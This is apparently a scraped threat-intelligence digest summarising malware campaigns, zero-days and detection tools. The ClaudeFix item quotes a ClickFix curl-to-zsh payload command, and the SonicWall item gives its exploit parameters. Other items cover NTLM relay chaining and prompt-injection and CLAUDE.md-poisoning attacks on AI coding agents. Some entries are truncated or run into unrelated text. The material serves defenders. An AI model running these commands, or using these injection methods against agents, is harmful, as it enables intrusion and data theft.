item.title: Claude Code and DeepSeek Powered Chinese Cyber Espionage Campaign
item.description:
Chinese 🇨🇳 actors weaponized Claude Code and DeepSeek in a live espionage campaign, breaching government systems in Thailand 🇹🇭 and Afghanistan, fingerprinting Taiwanese 🇹🇼 defense supply chain targets, and running parallel credential-theft ops against financial firms across three continents.
- Hunt.io pivoted on TencShell C2 traffic on port 1111, fingerprinting 13 Hong Kong-based servers via a shared HTTP header. One exposed an open directory: 2,431 files, 80 subdirectories, operator logs in Simplified Chinese 🇨🇳, victim source code, phishing clones, and custom exploit scripts. A recovered CLAUDE.md file instructed Claude Code 2.1.165 to auto-build, test, and iterate phishing pages. DeepSeek-v4-pro handled attack logic and bypass reasoning when initial attempts failed, effectively a two-model offense pipeline.
- In Thailand 🇹🇭, SQLMap drove SQL injection against a government admin system, then a web shell disguised as a GIF delivered persistent access. 980 recovered files reference this target alone, with test entries confirming interactive, hands-on access, not just automated exfil. In Afghanistan, source code, DB credentials, and encryption keys from a Laravel 5.8.38 app were extracted and repurposed to build a custom deserialization exploit.

item.title: UAT-11795 deploys novel Starland RAT and bespoke WLDR C2 implant in financially motivated campaign
item.description:
Russian-speaking UAT-11795 deploys novel Starland RAT and bespoke WLDR PowerShell C2 implant against US 🇺🇸 and European targets, stealing credentials and crypto wallets since June 2025.
- Initial access is likely ClickFix social engineering: mshta.exe executes a weaponized HTA that drops a batch file to %AppData%\Local\Temp, downloads trojanized NSIS installers (MobaXterm, Zoom, WebEx, DBeaver, FACEIT), and sets persistence at HKCU\Software\Microsoft\Windows\CurrentVersion\Run with value "MyApp" pointing back to mshta.exe. A Russian-language developer comment in the VBScript confirms the actor's origin.
- Starland RAT is a Python payload XOR-decrypted (key 0xC6) from a file disguised as LICENSE.txt. It checks usernames and hostnames against sandbox lists including WDAGUtilityAccount and Cuckoo, persists via a scheduled task named PythonLauncher-{3 random chars} and a Startup LNK targeting pythonw.exe, beacons every 50-60 seconds XOR-encrypted with key "helo1", and uses a Polygon smart contract (0x6ae382ed2154cc84c6672e4e908cd2c69c1b35ba) as a blockchain-anchored fallback C2.
- WLDR agent is a fully in-memory PowerShell C2 implant using AES-256-CBC plus HMAC-SHA256 (PBKDF2, 5,000 iterations), a RunspacePool supporting 10 concurrent threads for real-time interactive execution, and mutex "f2j398fj239d8j23dkkskskkkkkkkkk" to prevent duplicate instances.

item.title: Hidden Infrastructure Exposed: ANY.RUN Reveals Hijacked Gov Websites Delivering Malware
item.description:
PhantomEnigma abuses 20+ hijacked Brazilian 🇧🇷 .gov.br portals to deliver a modular Node.js backdoor targeting banking and public-sector orgs, with phishing emails passing SPF, DKIM, and DMARC via compromised government mailboxes.
- Attack chain: victim receives a spoofed Polícia Civil or "Procuração Digital" email from a genuinely compromised .gov.br mailbox, clicks a link to a hijacked government portal, and runs a Delphi-compiled Inno Setup installer (e.g. Procuracao_Digital.exe, SHA-256 e0dae1a0...). This unpacks a patched Boostnote Electron app whose malicious index.js self-deobfuscates via String.fromCharCode, beacons victim COMPUTERNAME and USERNAME to C2, sets a Run key for persistence (T1547.001), and enters a taskExecute loop accepting eval() JS or dropped executables. Two beacon generations confirmed: legacy GET to /laravel.php?api=api and a newer POST to /nbw/ (live C2 zsxocjarsate[.]com confirmed July 12, 2026).
- The durable detection signal is the build chain, not the domains. The combination of delphi + inno + nodejs tags identifies all 231 sandbox sessions across the cluster even as C2 domains rotate weekly. Known delivery domains include policiacivilmg[.]com, psznaoehteeh[.]com, eeresofeuae[.]com, and zsxocjarsate[.]com. Beacon IPs 185.219.83[.]191 and 188.137.246[.]189 (AS214943 RAILNET). item.title: Unpacking the AsyncAPI npm supply chain compromise and import-time payload delivery
item.description:
Five @asyncapi npm packages were backdoored on July 14, 2026 via a GitHub Actions pwn request, delivering the Miasma modular RAT at import time, bypassing --ignore-scripts entirely.
- A malicious PR () exploited a pull_request_target misconfiguration in asyncapi/generator's docs-preview workflow, exposing the asyncapi-bot PAT. The attacker then pushed unauthorized commits that rode the project's own OIDC release pipeline, publishing five poisoned versions with valid provenance attestations in roughly 90 minutes: @asyncapi/specs 6.11.2-alpha.1 and 6.11.2, @asyncapi/generator 3.3.1, @asyncapi/generator-components 0.7.1, and @asyncapi/generator-helpers 1.1.1.
- Execution triggers at require()/import, not postinstall. The loader spawns a hidden detached Node.js child process, fetches sync.js (~8.2 MB) from IPFS CID Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf, and drops it to OS-specific NodeJS masquerade directories: %LOCALAPPDATA%\NodeJS (Windows), ~/.local/share/NodeJS (Linux), ~/Library/Application Support/NodeJS (macOS).
- Miasma (M-RED-TEAM v6.4, campaign miasma-train-p1) installs persistence via HKCU Run key "miasma-monitor" (Windows), miasma-monitor.service (Linux), or shell RC injection (macOS), and beacons to 85.137.53[.]71 on ports 8080/8081/8091 with decentralized fallback over Nostr, Ethereum DHT, and IPFS. Credential harvesting targeting 100+ env vars (GITHUB_TOKEN, NPM_TOKEN, AWS keys, SSH keys) was implemented but disabled in this build.

item.title: TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains
item.description:
TELEPUZ is an emerging modular MaaS backdoor active since late April 2026, delivered via ClickFix social engineering into a VIDAR Go dropper, with 36 commands, blockchain-based C2 fallback, and rapid daily build volume signaling fast growth.
- ClickFix lures a user into running a PowerShell one-liner that pulls a VIDAR Go variant (580b441e2961739fd26e54e0a0ea08351cb10a51839519fc722cfa39ecd0c954) from memshowblob[.]forum. VIDAR then fetches install.exe (stager) and telepuz.dll from hurgadatour[.]shop. The stager drops the 64-bit DLL, executes it via rundll32 with a named export, and migrates persistence to %AppData%\Local\DCFG\Runtime\Themes\Processor\etwhost.dll. Service persistence lands at HKLM\SYSTEM\CurrentControlSet\Services\CipherAllocator.
- TELEPUZ layers heavy evasion: indirect syscalls via trampolines patched into dfscli.dll or davhlpr.dll, NTDLL unhooking via NtMapViewOfSection, AMSI patched to return E_INVALIDARG, ETW neutered via xor eax,eax on EtwEventWrite and NtTraceEvent, DllNotification callbacks stripped, and anti-VM/CIS locale checks (Ukraine 🇺🇦, Russia-adjacent LCIDs) that terminate execution silently.
- C2 uses WebSockets over TLS to /cdn/health?sid= with four dead-drop fallback methods: a Telegram channel (t[.]me/chanadarkpart), a Steam profile (76561199705801219), a DNS TXT record on codebasecode[.]com, and a Polygon smart contract (0xf55Bea1FdCf1c3ABb39ab92567C09aC1BFf6753E) that also serves as a kill switch.

item.title: Rapid7 MDR Team Discovers New SonicWall SMA1000 Zero Days being Actively Exploited (CVE-2026-15409, CVE-2026-15410)
item.description:
Two zero-days in SonicWall SMA1000 (CVE-2026-15409, CVSS 10.0 + CVE-2026-15410) are chained for unauthenticated RCE and root escalation, actively exploited before disclosure, and now in CISA KEV.
Patch urgency: emergency. No workaround exists.
- CVE-2026-15409 (CVSS 10.0) is an SSRF in the /wsproxy endpoint of SonicWall WorkPlace on port 443. An unauthenticated attacker supplies host=0.0.0.0 and port=1050 to tunnel into the Erlang process on localhost, where a hardcoded cookie achieves RCE as the couchdb user with no authentication required (T1190).
- CVE-2026-15410 escalates that foothold to root via a path traversal in the remove_hotfix workflow of ctrl-service on port 8188. A POST to /rollbackConfirm.action with hotfix=../../../../../tmp/1234.sh causes the system to chmod and execute the attacker script as UID 0, then reboot (T1068).
- Rapid7 MDR observed threat actors harvesting credentials, active session databases, and TOTP MFA seed configs from /tmp/temp.db, then pivoting to internal domain controllers via NTLM logon type 3 (Event ID 4624) originating from the appliance IP using non-inventory hostnames like "kali" with no corresponding VPN session.
- Attacker infrastructure tied to ASN 206092 (F.N.S Holdings Limited): observed CIDR ranges 45.131.194.0/24, 45.146.54.0/24, 63.135.161[.]0/24, 173.239.211.0/24, and individual IPs 193.37.32[.]179, 216.73.163[.]151.

item.title: There and Back Again: An Operators Guide on NTLM Relaying Egress
item.description:
NTLM relay over egress is still live in ~70-80% of AD environments. SpecterOps details "There and Back Again": coerce outbound WebDAV or SMB auth, catch it on a cloud VM, relay back through C2 SOCKS5 to LDAP or ADCS.
- The full chain runs without local admin: StartWebClient BOF (ETW trigger, no admin needed) starts WebClient, rpc2efs.py remotely starts EFS, PetitPotam triggers EFSRPC coercion to a WebDAV connection string pointing to a cloud VM (e.g. 40.90.233[.]199) on 443/TCP, bypassing SMB egress blocks on 445/TCP. ntlmrelayx.py catches and relays the auth over proxychains4 SOCKS5 back to an internal LDAP/LDAPS or ADCS (ESC8) endpoint.
- Post-relay impact is full host takeover: ntlmrelayx writes msDs-KeyCredentialLink (shadow credentials) on the relayed machine account, certipy authenticates with the resulting PFX to get a TGT, then PKINITtools gets4uticket performs S4U2Self to impersonate a local admin over cifs, and wmiexec escalates to WORKSTATION\Administrator.
- The cloud pivot uses iptables PREROUTING to redirect 443 to 8443, then an SSH reverse port forward carries the auth back to the teamserver. DNS record addition (dnstool.py from Krbrelayx) requires only low-privilege domain user rights, making the setup fully operable from a standard C2 foothold.

item.title: ClaudeFix: Shared Claude Chats Meet ClickFix
item.description:
MacSync Stealer distributed via ClickFix commands embedded in shared Claude AI chats, using Google malvertising to reach Mac users searching for Claude between June 12-19, 2026.
- Malvertising drove victims searching "claude download" to shared Claude chats impersonating "Apple Support." The ClickFix lure instructed users to paste: curl -kfsSL $(echo '[base64]'|base64 -D)|zsh, fetching stage one from lasvegaslaminateflooring[.]com/curl/0e17984a73d0b1c9c7c3916d32c49c8937f2e42d4c72c543c82999463a507abb
- Three-stage fileless chain: stage one returns a gzip-compressed zsh script, stage two runs entirely via eval and pipes stage three to osascript, leaving no file on disk. Exfiltration writes to /tmp/osalogging.zip in 10MB chunks via HTTP PUT, then self-deletes. Persistence appends a curl command to ~/.zshrc.
- MacSync Stealer targets macOS keychain files, Chromium and Gecko browser credentials, 100+ crypto wallet extensions, desktop wallets (Exodus, Electrum, Ledger Live, Trezor), SSH/AWS/Kubernetes keys, and files matching wallet, seed, kdbx, pem, ovpn extensions. Russian-language comments in the AppleScript payload suggest a Russian-speaking threat actor.
- C2 infrastructure used US 🇺🇸 city-themed domains: 22 Google campaign IDs observed across 7 search terms including "claude 客户端."
Hunt macOS endpoints for ~/.zshrc modifications containing curl pipes to zsh, /tmp/macsync_*.lock directories, and /tmp/osalogging.zip.

item.title: Investigating Persistence Mechanisms in AWS
item.description:
AWS persistence survives containment: IAM backdoors, Lambda code injection, and federated tokens let attackers outlast credential rotations and even account disabling.
- Attackers chain iam:CreateUser with iam:CreateAccessKey and iam:AttachUserPolicy to plant a durable foothold. The trail is in CloudTrail: filter requestParameters.userName for unknown accounts, exclude Get/List/Describe noise, and group by userIdentity.arn plus eventName to surface what permissions were granted and by whom.
- iam:CreateRole or iam:UpdateAssumeRolePolicy with external account IDs in the Principal block gives attacker-controlled accounts cross-account assume-role access. Hunt CloudTrail for CreateRole and UpdateAssumeRolePolicy events whose policyDocument contains unrecognized account IDs, then pull all sts:AssumeRole calls from those accounts.
- Lambda backdoors (T1059) deploy Python that calls iam:CreateUser, attaches AdministratorAccess, and returns plaintext credentials. Exposure via lambda:CreateFunctionUrlConfig with authType NONE or apigateway:CreateIntegration makes it internet-reachable. Check older function versions, legitimate-looking code may be a cover layer.
- STS GetFederationToken issues temporary creds that survive the source key's deletion or disabling until they expire naturally. The sessionContext.sessionIssuer field is your pivot: it names the compromised IAM user. Apply a deny-all to that user immediately and hold it until the federated creds expire.

item.title: Forgotten UEFI shims undermining Secure Boot
item.description:
11 forgotten, still-trusted UEFI shims (v0.9 and below) bypass Secure Boot on any system enrolling the Microsoft Corporation UEFI CA 2011 certificate. CVE-2026-8863 and CVE-2026-10797 assigned; revoked in Microsoft's June 9 2026 Patch Tuesday dbx update.
- The core risk is not a novel bug: any attacker can copy a vulnerable, Microsoft-signed shim to the EFI System Partition of a target machine regardless of its installed OS, pair it with an old GRUB 2 binary, and execute unsigned code at boot, enabling bootkits like BlackLotus, Bootkitty, or HybridPetya. No memory corruption, no ROP chain required.
- CVE-2026-10797 (shims v0.9 and below): the revocation check and signature verification functions read the signature length from different PE structures. An attacker manipulates the WIN_CERTIFICATE length field so dbx and MokListX comparisons run against garbage, silently bypassing certificate-based revocations for any shim-embedded certificate.
- Pre-v15.3 shims ignore SBAT entirely; pre-v0.9 shims ignore MokListX. An enterprise that revoked a compromised MOK certificate via MokListX is fully exposed if an attacker substitutes one of these old shims, which trusts MokList but skips the denylist.
- 11 PE Authenticode hashes were added to dbx on June 9 2026. Note: the expiration of Microsoft Corporation UEFI CA 2011 on June 27 2026 does NOT revoke trust in binaries it signed; certificate expiry has no effect on Secure Boot verification.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2077348575936434289

item.title: OkoBot: new sophisticated malware framework targets cryptocurrency users
item.description:

The SSH bot then disables Windows Defender notifications via registry, patches termsrv.dll for concurrent RDP, creates a local RDP user, and plants a scheduled task named "Apple Sync" for hourly reverse-SSH persistence.
- The plugin dispatcher rides DLL hijacking through a malicious protobuf.dll (later version.dll) sideloaded by the open-source Volume2.exe. The payload decrypts via AES-GCM with a static 256-bit key and polls C2 every 20 seconds. Five plugins handle CMD/PowerShell execution, enumeration, dropping, and process injection. Hash: B07D451EE65A1580F20A784C8F0E7A46 (protobuf.dll).

item.title: ADPathFinder: OpenGraph Attack Path Mapping in BloodHound CE
item.description:
NetSPI releases ADPathFinder, an open-source tool that chains BloodHound CE graph data across AD, ADCS, MSSQL, and SCCM to surface cross-dataset privilege escalation paths a manual query workflow would miss.
Key details:
- ADPathFinder queries a combined BloodHound CE graph built from SharpHound, MSSQLHound, and ConfigManBearPig, then groups paths that share edges so a 20,000-user domain produces prioritised findings rather than hundreds of near-duplicates. Standalone issues like SMB signing disabled rank higher when they sit on an onward escalation path.
- ADCS coverage includes ESC1 through ESC9. SCCM covers TAKEOVER-1/2/4/5/6/7/8, ELEVATE-1, anonymous policy access, and PXE distribution point checks. MSSQL checks cover linked servers, login impersonation, and NTLM relay exposure.
- Password auditing ties cracked NTDS and hashcat potfile output to BloodHound graph context: a cracked password on a Kerberoastable account sitting on a DA path is a different severity finding than a cracked standard user, and the report separates them automatically.
- Output is an HTML report per domain with embedded attack path graphs and PowerShell confirmation commands. JSON and text outputs are also written for automation or peer review. The --unsafe-report flag, off by default, adds cleartext passwords for deliverables that require it; those files carry the same sensitivity as the source NTDS dump.

item.description:
Scattered Spider (G1015) skips exploits entirely and uses social engineering plus silent RMM installs to maintain access. Here is how to hunt the behavior, not just the hash.
Key details:
- Scattered Spider gains initial access through help-desk impersonation calls, convincing employees to approve MFA prompts or install remote tools. No malware, no exploit, just a convincing English-speaking caller who has researched the org's internal processes (T1566, T1199 adjacent social engineering).
- Once inside, the group runs ADExplorer for AD recon, Mimikatz for credential access, Chisel for tunneling, BruteRatel for remote access, and defense evasion tools POORTRY and STONESTOP before pivoting to legitimate RMM tools including AnyDesk, TeamViewer, ScreenConnect, and VNC (T1219.002).

- Scope matters for triage: a single endpoint hit warrants immediate escalation; the same pattern spread across many machines points to a sanctioned IT deployment.
Hunt for the silent-install command-line pattern in Windows Event logs or your EDR. A clean IOC scan is not a clean bill of health. The HUNTER "AnyDesk Silent Installation" package is free in the Community Edition.

item.title: No single pane of glass: Anatomy of an Azure permission takeover
item.description:

The Event Hub namespaces had no diagnostic settings at all, so the telemetry pipeline the attacker drained would have left no trace.

item.title: The serpent’s tongue: Luring the Python out of its den
item.description:
Python supply chain attacks execute payloads at install time, not runtime. Cisco Talos maps every abuse technique across the package lifecycle, from setup.py hooks to .pth persistence, giving defenders a structured hunt framework.

Worse, .pth files dropped into site-packages or dist-packages execute on every Python invocation persistently, a technique TeamPCP used in the litellm supply chain compromise. item.title: WhatsApp forensics in 2026 and what survives end-to-end encryption
item.description:
WhatsApp forensics in 2026: E2E encryption protects the wire, not the device. Spyrtacus and the Cellebrite-Pivovarov case both confirm the endpoint is the target, and the artifacts are richer than most examiners expect.
- Android splits evidence across /data/data/com.whatsapp/databases/msgstore.db (live, unencrypted chats), wa.db (contacts), and /sdcard/WhatsApp/Databases/msgstore.db.crypt15 (daily encrypted backup). The 64-byte key at /data/data/com.whatsapp/files/key is required to decrypt; crypt15 uses a protobuf-encoded key with rotating parameters that broke older single-format scripts. wa-crypt-tools by ElDavoo handles the full crypt15 pipeline and remains the most maintained open-source option.
- iOS consolidates messages, group metadata, and media references in /private/var/mobile/Containers/Shared/AppGroup/GUID/ChatStorage.sqlite under the ZWAMESSAGE table. Critical detail: ZMESSAGEDATE uses Core Data epoch (seconds since 2001-01-01), not Unix time. Merging Android and iOS timelines without correcting this produces timestamp drift that can look like tampering.
- The Spyrtacus campaign (fake WhatsApp APK delivered via social engineering to ~200 Italian 🇮🇹 users) left no trace in msgstore.db. The evidence lived in SMS history, browser history, package installation timestamps, installer source, and accessibility service grants. A WhatsApp exam that stops at the chat database is an incomplete exam.

item.title: Anatomy of a helpdesk social engineering attack (and how to stop MFA bypass)
item.description:
Scattered Spider and copycat actors are bypassing MFA entirely through helpdesk social engineering, not malware. AI-assisted voice cloning and PII scraping have made this attack chain nearly frictionless in 2026.
Key findings:
- Attack chain: recon via data brokers and LinkedIn builds a PII profile, then a caller impersonates the employee, defeats knowledge-based verification, and convinces helpdesk to reset the password and re-enroll MFA to an attacker-controlled device. No exploit, no malware, just a phone call.
- Once inside the cloud account, threat actors scrape emails for credentials, pivot to document shares, send fraudulent invoices to suppliers, or use residential proxies to blend sessions so the access looks entirely routine, including satisfied MFA on an enrolled device.
- If only a password reset is obtained, push bombing follows: flooding the real user with approval prompts until one is accepted, or calling helpdesk back to have the login manually approved.
- Detection still exists even after a clean social engineering call: MFA device enrollment events, impossible travel, new device sign-ins, and off-hours resets all surface in cloud telemetry. Correlate those signals rather than waiting for a single alert.
Treat MFA re-enrollment as a privileged action requiring manager approval or callback to a pre-enrolled number, never PII alone. Migrate toward FIDO2 or passkeys to eliminate push bombing and SIM-swap risk entirely.

item.title: Dell BIOS Passwords: Weak XOR Encryption Allows Recovery from SPI Flash (CVE-2026-40639)
item.description:
CVE-2026-40639: Dell BIOS passwords stored under reversible XOR encryption in SPI flash, recoverable in milliseconds with a chip programmer. Actively unpatched on the Wyse 5070 thin client as of today.
Key findings:
- Dell's SystemPwSmm SMM driver stores BIOS admin/user passwords as XOR-encrypted data in the DVAR region of SPI flash, not a hash. The first byte is stored in cleartext. For passwords up to 12 characters, null-padding in the 32-byte field leaks the entire 20-byte key directly. No brute force needed.
- The key is derived from mostly device-static data plus the cleartext first byte, meaning only 256 possible keys exist per device. DVAR is log-structured, so deleted password records persist on flash. A short historical password with the same first character hands you the key to decrypt a longer current one.
- Confirmed vulnerable: Latitude E7250, Latitude 7490, XPS 15 9560, Wyse 5070. Not vulnerable: OptiPlex 3000 and newer models using SIVB with SHA-256. DSA-2026-197 patches Edge Gateway and Precision lines; the Wyse 5070 and confirmed-vulnerable Latitudes are not in that first wave. Dell targets remaining fixes by end of July 2026.
- CVSS 3.1 scored 5.7 by Dell (AV:P/AC:H), 6.1 by researchers (AV:P/AC:L). Physical access to flash is required via SOIC clip or attacker-controlled OS boot. Impact: disables Secure Boot, changes boot order, and can break TPM-backed BitLocker chains if unmeasured settings are modified.

item.title: Symlinks Are Still Scary (And Yes, You Can Commit Them to Git)
item.description:

Key details:
- The attack chain stacks three failures: prompt injection via README instructions aimed at the agent, symlink traversal without path resolution, and a confirmation dialog that shows the friendly filename (project_settings.json) while hiding the real target (~/.ssh/authorized_keys or ~/.zshrc). Remove any one link and the attack fizzles. Git stores symlinks with file mode 120000, blob content is the raw target path, and recreates them faithfully on clone on Linux and macOS.
- Six agents tested: Amazon Q Developer, Claude Code, Augment, Cursor, Google Antigravity, and Windsurf. All showed variations of the flaw. In several, the write completed before a confirmation dialog appeared. In the Claude Code case, the agent's own internal reasoning correctly identified the real target file, then the dialog told the human it was editing "project_settings.json." CWE-61 covers the symlink following; CWE-451 covers the UI misrepresentation. AWS, Google, and Cursor shipped fixes.

MFA is irrelevant once a token is stolen and replayed. Forensic proof lives in ns.log: 5,000+ AAA LOGIN_FAILED events with binary garbage in the User field is leaked heap, not a spray. A session active from an attacker IP with zero successful logins is the smoking gun.
- Printer mappings are a gift. Citrix auto-creates client printer entries in the Windows Application log, embedding the attacker's workstation name. WIN-4E0AP4JTJR9 and WIN-VI960VQI4I6 appeared case after case. Pivot between Microsoft-Windows-TerminalServices-LocalSessionManager/Operational (source IP plus session ID) and MetaFrameEvents (session ID to client name) to fingerprint the operator's machine.
- Privilege escalation uses a REG_LINK registry symlink planted under the RdpBus device class GUID, redirected into GPO-List\test. gpupdate forces a SYSTEM-context write through the link; sc start AppMgmt detonates it.

item.title: The Two BIOS Passwords Everyone Confuses
item.description:
"We set the BIOS password" is not a complete sentence. Setup password and boot password protect different things, and mixing them up leaves firmware-level gaps on every machine in the fleet.
Key findings:
- The setup (administrator) password gates firmware config changes: Secure Boot state, boot order, TPM, IOMMU. It does NOT prompt at power-on. A stolen laptop with only this set boots straight to the OS. The boot (power-on) password is what stops the machine from starting at all. One password does not cover the other.
- Vendor naming makes this worse. Lenovo calls them Supervisor + Power-On, Dell calls them Admin + System, HP calls them BIOS Administrator + Power-On. A policy or ticket that says "set the BIOS password" has not actually specified which control was configured.
- Setting the admin password does not automatically lock configuration changes. There is a separate setting to prevent boot-order and Secure Boot edits when an admin password is present. Miss it and the password is half the control it should be.
- Eclypsium's flash-dump research found at least one vendor storing the admin password in plaintext ASCII in a firmware variable, and another using a short, truncated hash built from a static key, making it crackable offline and identical across every unit of that model.
Audit state, not policy. Read the actual password-set flag per device via /sys/class/firmware-attributes/ on Linux or vendor WMI namespaces on Windows.

item.title: Finding SOCKS with Proxywatch
item.description:
SpecterOps releases Proxywatch, a behavior-based open-source tool to detect SOCKS proxy pivots, C2 beaconing, and tunneling activity on live endpoints without relying on static signatures or process-port baselines.
- SOCKS proxy pivoting lets attackers run tools like Impacket, nmap, or netexec entirely from their own machine through a compromised host, meaning no new processes spawn on the victim, no attacker tooling touches disk, and EDR parent-child detection models see nothing. C2 frameworks like Cobalt Strike, Sliver, and Mythic all support this natively. This is why registry persistence created via Impacket reg.py over SOCKS gets missed: the code never executes on-target.
- Proxywatch runs on Linux and Windows, reading /proc/net/tcp and /proc/<pid>/fd on Linux, and GetExtendedTcpTable plus CreateToolhelp32Snapshot on Windows. It builds per-process behavioral profiles using 83 signals including loopback usage, multiplex relay patterns, callback cadence, jitter measurement, writable-path binaries, and named pipe C2 patterns, then assigns roles: control-channel, control-pivot, listener, or outbound.
- In a live demo, cheerful_glove.exe (a Sliver beacon) was flagged control-pivot via signals pivot-multiplex-relay and pivot-non-loopback-internal. A separate beacon, beacon-j.exe, was caught via a 75-second callback pattern with 0.44 jitter, unsigned binary, and suspicious-exe-path (C:\Users\ops\Desktop\testing\).

item.title: GigaWiper: Anatomy of a destructive backdoor assembled from multiple malware
item.description:
GigaWiper is a Golang backdoor that merges three separate destructive malware families into a single modular implant, observed wiping targets since October 2025.
- GigaWiper combines a raw disk wiper, a Crucio ransomware-derived fake encryptor (command 3, .candy extension, keys never saved), and a reimplemented FlockWiper secure multi-pass wiper (command 12) as discrete C2 commands. C2 runs over RabbitMQ (AMQP) and Redis with AES-encrypted config; observed C2 IPs are 185.182.193[.]21 and 212.8.248[.]104.
- Persistence lands via a scheduled task named "OneDrive Update" (runs every minute plus at startup) and tracks execution count in HKCU\SOFTWARE\OneDrive\Environment. Command 19 clears System, Setup, Application, and Security event logs, including a direct delete of C:\Windows\System32\winevt\Logs\Security.evtx if wevtutil fails.
- Code overlap links GigaWiper to Crucio (CISA advisory, Dec 2023) via shared BigBangExtortMain function, and to FlockWiper (VirusTotal, June 2025) via PDB paths referencing "GRAT" and identical execution flow, suggesting one actor built all three tools.
- IOC hashes (4 backdoor, 1 standalone wiper, 1 Crucio, 2 FlockWiper) and both C2 IPs are in the Microsoft report. Microsoft Defender detections include WprFlock, WprCree, FlockWiper, and GigaWiper signatures.
Hunt for the "OneDrive Update" scheduled task, outbound AMQP/Redis to the listed IPs, and Golang PE files in unexpected paths.

item.title: Hiding in the Chain: Multi-Stage LNK Attack Leveraging TON Blockchain to Deliver Node.JS Backdoor
item.description:
Multi-stage LNK attack uses TON blockchain as a C2 resolver and drops a Node.js backdoor, making traditional domain-based blocking ineffective against this campaign.
Key findings:
- Initial access via a malicious ZIP containing a .lnk file. When executed, the shortcut fires a hidden PowerShell command (T1059.001) that downloads a legitimate node.exe binary and deploys a Node.js backdoor, blending malicious traffic with a trusted runtime.
- The malware uses EtherHiding (T1102): querying the TON blockchain to retrieve the live C2 address. Blocking a domain or IP does nothing here because the C2 pointer lives on an immutable ledger, not a registrar-controlled hostname.
- DFIR artifact focus: hunt for node.exe spawned from unusual parent processes (PowerShell, explorer, or a user temp path), LNK files in ZIP archives in user download or temp directories, and outbound connections to TON API endpoints from non-developer endpoints.
- Persistence and execution chain artifacts to collect: LNK file metadata (birth timestamps, target command line), PowerShell Script Block Logging (Event ID 4104), and any downloaded node.exe with a non-standard install path outside Program Files.
Detect node.exe making external network calls where the parent is PowerShell or the binary lives outside a standard install path. Enable Script Block Logging if you have not; the full payload command is captured there. Check the LevelBlue report for IOCs.

item.title: Fake VPN and 7-Zip Apps Turn Victims Into Residential Proxy Nodes
item.description:
"Lurking Lizard" ran a covert residential proxy business since 2022, enrolling victim devices via trojanized 7-Zip and WireVPN apps without consent, with over 1 million Android downloads.

- The attack chain starts with typosquat domains like 7zip[.]com (vs. the real 7-zip[.]org) delivering trojanized installers. - A hardcoded IPLogger beacon at hxxps://iplogger[.]com/mnWD appeared across multiple payloads spanning years, tying fake 7-Zip, WireVPN, and fake TikTok/YouTube tools to one operator. Lurking Lizard used a legitimate third-party tracker to avoid hosting their own C2 telemetry.
- WireVPN is signed with a valid certificate issued to WEILAI NETWORK TECHNOLOGY CO., LIMITED. Network behavior exposes it: rather than a single stable VPN tunnel, it pings large numbers of distributed IPs and maintains multiple concurrent connections, classic proxy-node behavior, not privacy-tool behavior.
- Infoblox mapped 230+ domains including smartproxy[.]org and proxyreviews[.]org back to this actor via shared DNS, hosting, and WHOIS data. WHOIS registration points toward China 🇨🇳 (Wuhan area codes, registrant names including Cheng Li variants).
Hunt C:\Windows\SysWOW64\wire and \hero for unsigned or anomalously signed executables.

item.title: Detection Engineering in the Era of Semantic Malware
item.description:
Brainworm and the promptware kill chain are forcing detection engineers to rebuild core assumptions. Signatures, process trees, and network indicators all degrade when the attacker writes English, not assembly.
- Brainworm (Origin, March 2026) is a PoC that poisons CLAUDE.md with natural language C2 instructions over RabbitMQ/AMQP. No binary, no shellcode. The agent runtime executes malicious tool calls indistinguishable from legitimate ones. Researchers formalized 36 incidents (2023-early 2026) showing promptware now routinely achieves persistence, C2, lateral movement, and exfiltration across Claude Code, Cursor, Devin, and Slack AI.
- Memory config files are the new registry Run key. Alert on any modification to CLAUDE.md, .cursorrules, AGENTS.md, or GEMINI.md by a process other than a known IDE or git operation, especially diffs containing URLs, shell commands, or base64 not in the last reviewed commit.
- Behavioral baselining is non-optional. You cannot signature-match non-deterministic tool call sequences, but you can baseline write-to-read ratios, session duration, and first-seen external destinations per agent session. Composite deviation across multiple fields is your signal, not any single indicator.
- Context window telemetry is the highest-value instrumentation gap: no major agent framework currently emits structured logs of what was loaded into the context window at inference time.

item.title: Hindsight 2026.06
item.description:

- Firefox is now parsed alongside Chromium browsers. All profiles from all browsers merge into a single Timeline tab in XLSX output, with unified row types (url, cookie, autofill) so investigators can filter cross-browser activity in one view without stitching sources manually.
- Service Workers are parsed for the first time in Hindsight. Data comes from the Service Workers\Database LevelDB, which means historical and deleted records surface (shown as gray rows). A new Service Workers tab organizes origin, registration, and resources hierarchically.
- Downloads parsing is significantly expanded. Hindsight now reads shared_proto_db alongside the History DB, surfacing fields like download_source, request_headers, fetched_via_service_worker, and storage_partition. Critically, a new download (opened) row logs last_access_time when a user opened a file through the browser, a useful user-activity timestamp.
- The Extensions tab is now hierarchical: name, ID, and install info at the top level, with permissions and scripts nested below, improving readability during extension-abuse investigations.
Takeaway: update to v2026.06 via pip install pyhindsight or the GitHub release. On cross-browser cases, the merged Timeline tab is now your first stop.

item.title: UNC6692 and the SNOW Malware Ecosystem
item.description:
UNC6692 deploys the SNOW malware ecosystem via Microsoft Teams helpdesk impersonation, chaining email bombing, credential harvesting, and LSASS dumping to fully compromise a domain controller.
Key details:
- UNC6692 opened with an email bombing campaign to create user panic, then pivoted to Microsoft Teams (T1566.002) posing as IT helpdesk, directing victims to a fake "Mailbox Repair" portal on attacker-controlled AWS S3. The portal harvested credentials through repeated fake auth prompts and exfiltrated them to an actor S3 bucket (T1567.002).
- An AutoHotkey binary and script (T1059.010) with identical filenames auto-executed on download, deploying SNOWBELT, a malicious Chromium extension (T1176.001) masquerading as a heartbeat monitor. SNOWBELT pulled down SNOWGLAZE, SNOWBASIN, and Python utilities, then anchored persistence via a Startup folder shortcut (T1547.001) and scheduled tasks (T1053.005) launching hidden Edge processes while clearing security logs.
- SNOWGLAZE establishes WebSocket C2 tunnels (T1572) with SOCKS proxy support (T1090) through Heroku-hosted infrastructure. SNOWBASIN runs as a local HTTP server on port 8000, executing commands via cmd and PowerShell (T1059.003/001) and capturing screenshots (T1113).
- Lateral movement used PsExec over port 135 (T1021.002) and RDP through the SNOWGLAZE tunnel (T1021.001) to reach a backup server, where LSASS was dumped via Task Manager (T1003.001).
